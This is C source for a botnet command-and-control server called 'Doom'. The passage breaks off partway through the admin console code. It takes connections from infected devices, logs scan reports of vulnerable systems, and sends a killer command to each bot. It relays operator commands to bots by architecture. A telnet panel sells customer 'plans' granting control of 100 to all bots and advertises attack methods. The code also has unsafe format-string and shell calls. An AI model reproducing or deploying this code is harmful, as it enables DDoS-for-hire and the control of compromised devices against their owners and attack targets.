
#include "headers/includes.h"
#include "headers/misc.h"

/*  C2 SETTINGS */
#define PORT 77
#define MAXFDS 1000000

#define GRAY     "\x1b[0;36m"
#define C_RESET "\x1b[0;36m"
#define CYAN    "\x1b[0;93m"

int ppc = 0;
int sh4 = 0;
int x86 = 0;
int armv4 = 0;
int armv5 = 0;
int armv6 = 0;
int armv7 = 0;
int mips = 0;
int m68k = 0;
int debug = 0;
int sparc = 0;
int mipsel = 0;
int boxes = 0;
int unknown = 0;
int pmalinux = 0;
int pmawindows = 0;
int adminstatus;
char string[2048];
int availablebots;
char *ss_name = "Doom"; 
char *ss_copyright = "Diablo"; 
char *ss_ver = "1";

// customer plans
char *plans[] = {
    "noob", // 0 bot count
    "plan1", // 100 bot count
    "plan2", // 1000 bot count
    "plan3", // 5000 bot count
    "all" // all bot count
};

////////////////////////////////////
struct account {
    char id[200]; 
    char password[200];
    char type[200];
    char plan[200];
    int maxbots;
};
static struct account accounts[15]; //max users
struct consoledata_t {
    char banned[20];
} console[MAXFDS];
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
        char arch[30];
} clients[MAXFDS];
struct telnetdata_t {
        char ip[16];
        int mute;
        int connected;
        int adminstatus;
        char nickname[20];
} managements[MAXFDS];
struct telnetListenerArgs {
    int sock;
    uint32_t ip;
};
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Change The Port Idiot\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void util_trim(char *str)
{
    int i, begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;
    while ((end >= begin) && isspace(str[end]))
        end--;
    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}
void broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int thefd)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        char fhdjkc[1024];
        int i;
        char *bin_type;
        char mybin_type[40];
        if(strstr(msg, "bin=") || strstr(msg, "BIN="))
        {
            char *mytok = strtok(msg, "=");
            char mytok2[200];
            snprintf(mytok2, sizeof(mytok2), "%s", mytok+strlen(mytok)+1);
            bin_type = strtok(mytok2, " ");
            if(bin_type == NULL || bin_type == " ")
                bin_type = "ALL";
            //printf("Bin is -> %s\n", bin_type);
            msg = strtok(mytok2, " ")+strlen(mytok2)+1;
            snprintf(mybin_type, sizeof(mybin_type), "%s", bin_type);
            trim(mybin_type);
            trim(msg);
        }
        else
            snprintf(mybin_type, sizeof(mybin_type), "%s", "ALL");
        
        for(i = 0; i < amt2send; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(fuck == 1)
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1b[0;93m%s Logged In\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                    memset(fhdjkc, 0, sizeof(fhdjkc));
                }
                else if(fuck == 3)
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1b[0;93mAdmin(%s) Logged In\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                    memset(fhdjkc, 0, sizeof(fhdjkc));
                }
                else if(fuck == 2)
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1b[0;36m%s Logged Out\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                    memset(fhdjkc, 0, sizeof(fhdjkc));
                }
                else if(fuck == 4)
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1b[0;36mAdmin(%s) Logged Out\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                    memset(fhdjkc, 0, sizeof(fhdjkc));
                }
                else
                {
                    if(managements[i].mute == 0 && sendMGM && managements[i].connected)
                    {
                        send(i, "\n", 1, MSG_NOSIGNAL);
                        send(i, "\x1b[0;93m", strlen("\x1b[0;93m"), MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                        send(i, msg, strlen(msg), MSG_NOSIGNAL);
                        send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
                    }
                    if(strstr(mybin_type, "ALL"))
                    {
                        if(clients[i].connected)
                        {
                            send(i, msg, strlen(msg), MSG_NOSIGNAL);
                            send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
							send(i, "\r\n", 2, MSG_NOSIGNAL);
						}
                    }
                    else if(clients[i].connected && strstr(clients[i].arch, mybin_type))
					{
                        send(i, msg, strlen(msg), MSG_NOSIGNAL);
                        send(i, "\x1b[37m", strlen("\x1b[37m"), MSG_NOSIGNAL);
						send(i, "\r\n", 2, MSG_NOSIGNAL);
					}
                    else
                        continue;
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: \x1b[0;36m", managements[i].nickname);
                    if(managements[i].mute == 0 && sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    else if(managements[i].mute == 0 && !clients[i].connected) send(i, "\r\n", 1, MSG_NOSIGNAL);
                    memset(fhdjkc, 0, sizeof(fhdjkc));
                }
        }
        free(wot);
}

const char *get_host(uint32_t addr)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}

void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKING SURE AGAIN HERE BY SENDING !* LOLNOGTFO
                                                if(send(infd, "!* LOLNOBYE\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* DOOM\r\n", strlen("!* DOOM\r\n"), MSG_NOSIGNAL);//start killer
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // Basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                    if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                else if(strstr(buf, "REPORT ") == buf) // Received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // Let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                else if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
                                                else if(strstr(buf, "arch ") != NULL)
                                                {
                                                    //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                                                    char *arch = strstr(buf, "arch ") + 5;
                                                    strcpy(clients->arch, arch);
                                                    strcpy(clients[thefd].arch, arch);
                                                    printf(SUCCESS" IP: %s | Arch: %s\n", get_host(/*clients[thefd].ip*/client->ip), arch);
                                                    char k[60];
                                                    sprintf(k, "echo '%s' >> files/bot_connections.log", get_host(client->ip));
                                                }
                                                else if(strstr(buf, "illed bot process"))
                                                {
                                                    bot_procs_killed++;
                                                    printf("bot: \"%s\"\n", buf);
                                                }
                                                else
                                                    printf("bot: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        snprintf(client->arch, sizeof(client->arch), "%s", "timed-out");
                                        snprintf(client[thefd].arch, sizeof(client[thefd].arch), "%s", "timed-out");
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}

void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char *string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0;Doom 1.0 | Devices: %d | Mercenaries: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return; 
            sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024]; // change 1024 to 512 if it doesnt work

    if((fp = fopen("logins.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void countArch()
{
    int x;
    ppc = 0;
    sh4 = 0;
    x86 = 0;
    armv4 = 0;
    armv5 = 0;
    armv6 = 0;
    armv7 = 0;
    mips = 0;
    m68k = 0;
    debug = 0;
    sparc = 0;
    mipsel = 0;
    boxes = 0;
    pmalinux = 0;
    pmawindows = 0;
    unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].arch, "ppc") && clients[x].connected == 1)
            ppc++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            sh4++;
        else if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            x86++;
        else if(strstr(clients[x].arch, "armv4") && clients[x].connected == 1)
            armv4++;
    	else if(strstr(clients[x].arch, "armv5") && clients[x].connected == 1)
            armv5++;
    	else if(strstr(clients[x].arch, "armv6") && clients[x].connected == 1)
            armv6++;
        else if(strstr(clients[x].arch, "armv7") && clients[x].connected == 1)
            armv7++;
        else if(strstr(clients[x].arch, "mpsl") || strstr(clients[x].arch, "mipsel") && clients[x].connected == 1)
            mipsel++;
        else if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            mips++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
            m68k++;
        else if(strstr(clients[x].arch, "debug") && clients[x].connected == 1)
            debug++;
        else if(strstr(clients[x].arch, "sparc") && clients[x].connected == 1)
            sparc++;
        else if(strstr(clients[x].arch, "servers") || strstr(clients[x].arch, "boxes") || strstr(clients[x].arch, "box") && clients[x].connected == 1)
            boxes++;
        else if(strstr(clients[x].arch, "pma") && strstr(clients[x].arch, "linux") && clients[x].connected == 1)
            pmalinux++;
        else if(strstr(clients[x].arch, "pma"))
            if(strstr(clients[x].arch, "windows") || strstr(clients[x].arch, "win") || strstr(clients[x].arch, "WIN") && clients[x].connected == 1)
                pmawindows++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1)
            unknown++;
    }
}
 
void *telnetWorker(void *arguments)
{
        struct telnetListenerArgs *args = arguments;
        char usernamez[80];
        int thefd = (int)args->sock;
        const char *management_ip = get_host(args->ip);
        //printf("%s\n", management_ip);
        int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("logins.txt", "r"); 
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        {
            fscanf(fp, "%s %s %s %s", accounts[j].id, accounts[j].password, accounts[j].type, accounts[j].plan);
            ++j;
        }
        
        char login1 [5000];
        
        if(!strcmp(management_ip, "127.0.0.1"))
        {
            char *kkkkeee = "\x1b[0;36mError, You cannot access this C2 from localhost, Sorry...\x1b[0;36m\r\n";
            if(send(thefd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
            close(thefd);
            goto end;
        }
        
        sprintf(login1,  "\x1b[0;36mEnter Credentials To Join\x1b[0;36m\r\n");
        
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, login1, strlen(login1), MSG_NOSIGNAL) == -1) goto end;

        
        
        if(send(thefd, "\x1b[0;93mUsername\x1b[36m: ", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        int mynick;
        for(mynick=0; mynick < MAXFDS; mynick++)
        {
            if(!strcmp(managements[mynick].nickname, nickstring))
            {
                char *kkkkeee = "\x1b[0;36mError, Duplicate Username!\x1b[0;36m\r\n";
                if(send(thefd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
                close(thefd);
            }
            else if(!strcmp(console[mynick].banned, management_ip))
            {
                char *kkkkeee = "\x1b[0;36mError, You've been Banned!\x1b[0;36m\r\n";
                if(send(thefd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
                close(thefd);
            }
        }
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(strcmp(nickstring, accounts[find_line].id) == 0){    
        if(send(thefd, "\x1b[0;93mPassword\x1b[36m: ", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;

        trim(buf);
        
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char *kkkkkkk = "\x1b[0;36mError, Incorrect Login Credentials\x1b[0;36m\r\n";
        if(send(thefd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) goto end;
        FILE *logFile;
        logFile = fopen("files/failed_attempts.log", "a");
        fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
        printf(FAILED" Failed Login Attempt (%s)\n", management_ip);
        fclose(logFile);
        //broadcast(buf, thefd, usernamez, 0, MAXFDS, thefd);
        memset(buf, 0, 2048);
        sleep(5);
        goto end;
        fak:
        
        pthread_create(&title, NULL, &titleWriter, thefd);
        char line6  [5000];
        char *hahalaughnow[60];

		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line9   [5000];

        FILE* fp1;
                char motd[255];
        char motd1[255];

        fp1 = fopen("motd.txt", "r");

        while(fgets(motd, 255, (FILE*) fp1)) {
        sprintf(motd1, "%s\n", motd);
        }
        fclose(fp1);
        
        sprintf(managements[thefd].nickname, "%s", accounts[find_line].id);
        sprintf(hahalaughnow, "echo '%s' >> files/client_connections.log", management_ip);
        system(hahalaughnow);
        if(!strcmp(accounts[find_line].type, "admin"))
        {
            managements[thefd].adminstatus = 1;
            broadcast(buf, thefd, accounts[find_line].id, 3, MAXFDS, thefd);
            printf("\x1b[0;93mAdmin(\x1b[0;93m%s\x1b[0;93m:\x1b[0;93m%s\x1b[0;93m) Logged In\x1b[0;36m\n", accounts[find_line].id, management_ip);
        }
        else if(!strcmp(accounts[find_line].type, "superadmin"))
        {
            managements[thefd].adminstatus = 2;
            broadcast(buf, thefd, accounts[find_line].id, 3, MAXFDS, thefd);
            printf("\x1b[0;93mSuperAdmin(\x1b[0;93m%s\x1b[0;93m:\x1b[0;93m%s\x1b[0;93m) Logged In\x1b[0;36m\n", accounts[find_line].id, management_ip);
        }
        else
        {
            managements[thefd].adminstatus = 0;
            broadcast(buf, thefd, accounts[find_line].id, 1, MAXFDS, thefd);
            printf("\x1b[0;93m%s:%s Logged In\x1b[0;36m\n", accounts[find_line].id, management_ip);
        }
        /*char *ohoklol[200];
        sprintf(ohoklol, "\x1b[97m- User Info -\nUsername: \x1b[0;36m%s\x1b[0;36m\nPassword: \x1b[0;36m%s\x1b[0;36m\nLevel: \x1b[0;36m%s\x1b[0;36m\nPlan: \x1b[0;36m%s\x1b[37m", accounts[find_line].id, accounts[find_line].password, accounts[find_line].type, accounts[find_line].plan);
        trim(ohoklol);
        printf("%s\n", ohoklol);*/
        if(!strcmp(accounts[find_line].plan, plans[0])) // noob 0, plan2 100, plan3 1k, plan4 5k, ALL all bots
        {
            availablebots = 0;
            accounts[find_line].maxbots = 0;
        }
        else if(!strcmp(accounts[find_line].plan, plans[1]))
        {
            availablebots = 100;
            accounts[find_line].maxbots = 100;
        }
        else if(!strcmp(accounts[find_line].plan, plans[2]))
        {
            availablebots = 1000;
            accounts[find_line].maxbots = 1000;
        }
        else if(!strcmp(accounts[find_line].plan, plans[3]))
        {
            availablebots = 5000;
            accounts[find_line].maxbots = 5000;
        }
        else if(!strcmp(accounts[find_line].plan, plans[4]))
        {
            availablebots = MAXFDS;
            accounts[find_line].maxbots = MAXFDS;
            //printf("%s using admin plan\n", accounts[find_line].id);
        }
        snprintf(line6, sizeof(line6), "\r\n"CYAN"%s"GRAY"@"CYAN"Doom\x1b[0;36m#\x1b[0;93m: "C_RESET, accounts[find_line].id);

        sprintf(ascii_banner_line1,   "\e[0;93m                \r\n");
        sprintf(ascii_banner_line2,   "\e[0;93m                \e[0;93m██████\e[97m╗  \e[0;93m██████\e[97m╗  \e[0;93m██████\e[97m╗\e[0;93m ███\e[97m╗   \e[0;93m███\e[97m╗\r\n");
        sprintf(ascii_banner_line3,   "\e[0;93m                \e[0;93m██\e[97m╔══\e[0;93m██\e[97m╗\e[0;93m██\e[97m╔═══\e[0;93m██\e[97m╗\e[0;93m██\e[97m╔═══\e[0;93m██\e[97m╗\e[0;93m████\e[97m╗ \e[0;93m████\e[97m║\r\n");
        sprintf(ascii_banner_line4,   "\e[0;93m                \e[0;93m██\e[97m║  \e[0;93m██\e[97m║\e[0;93m██\e[97m║   \e[0;93m██\e[97m║\e[0;93m██\e[97m║   \e[0;93m██\e[97m║\e[0;93m██\e[97m╔\e[0;93m████\e[97m╔\e[0;93m██\e[97m║\r\n");
        sprintf(ascii_banner_line5,   "\e[0;93m                \e[0;93m██\e[97m║  \e[0;93m██\e[97m║\e[0;93m██\e[97m║   \e[0;93m██\e[97m║\e[0;93m██\e[97m║   \e[0;93m██\e[97m║\e[0;93m██\e[97m║╚\e[0;93m██\e[97m\e[97m╔╝\e[0;93m██\e[97m║\r\n");
        sprintf(ascii_banner_line6,   "\e[0;93m                \e[0;93m██████\e[97m\e[97m╔╝╚\e[0;93m██████\e[97m\e[97m╔╝╚\e[0;93m██████\e[97m\e[97m╔╝\e[0;93m██\e[97m║ ╚═╝\e[0;93m ██\e[97m║\r\n");
        sprintf(ascii_banner_line7,   "\e[0;93m                \e[97m╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝\r\n");
        sprintf(ascii_banner_line8,   "\e[0;93m                𝓜𝓞𝓣𝓓\e[0;36m %s\e[0;93m\r\n", motd1);
        sprintf(ascii_banner_line9,   "\e[0;93m                \r\n");

        managements[thefd].mute = 0; // 0 = chat on | 1 = chat off    
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line6,  strlen(line6),  MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, thefd);
        managements[thefd].connected = 1;
        
        snprintf(managements[thefd].ip, sizeof(managements[thefd].ip), "%s", management_ip); // store our ip
        
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
            if(strstr(buf, "help") || strstr(buf, "HELP"))
        {  
        	sprintf(botnet, "\x1b[0;36m╔═══════════════════════════════════════╗\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mMETHODS\x1b[97m -\x1b[0;36m Shows Attack Commands.      \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mSERVER\x1b[97m -\x1b[0;36m Shows Server Commands.       \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mADMIN\x1b[97m -\x1b[0;36m Shows Admin Commands.         \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mSUPER\x1b[97m -\x1b[0;36m Shows Super Admin Commands.   \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mONLINE?\x1b[97m -\x1b[0;36m Shows Online User.          \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m║\x1b[0;36m \x1b[0;93mCLEAR\x1b[97m -\x1b[0;36m Clears Screen.                \x1b[0;36m║\x1b[0;36m\r\n");
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        	sprintf(botnet, "\x1b[0;36m╚═══════════════════════════════════════╝\x1b[0;36m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        }
        else if(strstr(buf, "bots") || strstr(buf, "BOTS"))
        {  
            countArch();
            if(clientsConnected() == 0)
            {
                sprintf(botnet, "\x1b[0;93musers [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", managesConnected);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "\x1b[0;93mUsers [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", managesConnected);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(ppc != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.powerpc [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", ppc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.sh4 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", sh4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(x86 != 0)
                {
                    sprintf(botnet, "\x1b[0;93mDoom.x86 [\x1b[0;36m%d\x1b[0;93m]\r\n\x1b[0;36m", x86);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv4 != 0)
                {
